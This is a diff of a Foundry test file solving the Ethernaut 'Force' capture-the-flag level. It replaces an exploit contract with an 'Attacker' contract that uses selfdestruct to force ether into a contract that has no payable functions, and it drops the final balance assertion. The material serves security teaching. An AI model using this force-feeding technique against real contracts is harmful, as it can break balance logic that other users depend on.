@@ -24,8 +24,9 @@ contract TestForce is BaseTest {
     }
 
     function setupLevel() internal override {
-        /** CODE YOUR SETUP HERE */
-
+        /**
+         * CODE YOUR SETUP HERE
+         */
         levelAddress = payable(this.createLevelInstance(true));
         level = Force(levelAddress);
 
@@ -34,37 +35,34 @@ contract TestForce is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
+        /**
+         * CODE YOUR EXPLOIT HERE
+         */
+
+        // Goal here is to send some ether to the contract
+        // Since there is no payable functions, no receive() and fallback(), we need to selfdestruct some other contract that has ETH
 
         vm.startPrank(player, player);
 
-        // There are 4 way to send ether to a contract
-        // 1) they implement a `payable` function
-        // 2) they implement a `receive` function. A special function to receive ether
-        // 3) they implement a `fallback` payable function. A special function automatically triggered
-        // when you call a contract's function that does not exist
-        // 4) a contract call selfdestruct() (destroying itself) and specifying the destination to send it's balance to
+        // Deploy contract and send some eth to it
+        Attacker attacker = new Attacker{value: 1 ether}(payable(address(level)));
 
-        // In this specific case `Force` contract does not implement any of the first three method
-        // so you can only send ether via the selfdestruct
-        // Why is important to know that a contract can receive ether even if they don't want to?
-        // because it could mess up your balance logic!
-        // More info on the topic
-        // - https://consensys.github.io/smart-contract-best-practices/attacks/force-feeding/
-        // - https://solidity-by-example.org/sending-ether/
-        // - https://swcregistry.io/docs/SWC-132
-
-        new Exploiter{value: 1}(payable(address((level))));
-
-        assertEq(address(level).balance, 1);
+        // Selfdestruct the attacker contract to send the ETH to the level contract
+        attacker.attack();
 
         vm.stopPrank();
     }
 }
 
-contract Exploiter {
-    constructor(address payable to) public payable {
-        // redirect all the `msg.value` to `to` when selfdestructing
-        selfdestruct(to);
+contract Attacker {
+    address payable private level;
+
+    constructor(address payable _level) public payable {
+        require(msg.value > 0, "Attacker: No ETH sent");
+        level = _level;
+    }
+
+    function attack() public {
+        selfdestruct(level);
     }
 }
